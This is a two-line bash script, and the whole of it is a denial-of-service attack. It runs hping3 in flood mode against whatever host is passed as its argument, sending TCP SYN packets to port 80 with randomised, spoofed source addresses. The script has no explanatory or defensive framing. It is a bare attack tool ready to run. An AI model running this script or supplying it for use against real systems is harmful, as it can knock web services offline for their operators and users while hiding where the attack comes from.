#!/bin/bash
hping3  --flood  --rand-source $1 -S -p 80
